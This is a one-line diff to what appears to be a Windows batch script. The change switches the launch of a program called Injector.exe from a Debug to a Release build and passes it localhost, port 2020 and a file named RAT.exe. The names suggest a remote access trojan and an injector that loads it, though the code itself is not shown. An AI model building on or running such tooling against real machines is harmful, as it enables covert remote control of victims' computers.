@@ -1,1 +1,1 @@
-"%~dp0BuildC++\build\Debug\Injector.exe" 127.0.0.1 2020 .\BuildC++\build\Debug\RAT.exe
+start "" "%~dp0BuildC++\build\Release\Injector.exe" 127.0.0.1 2020 RAT.exe
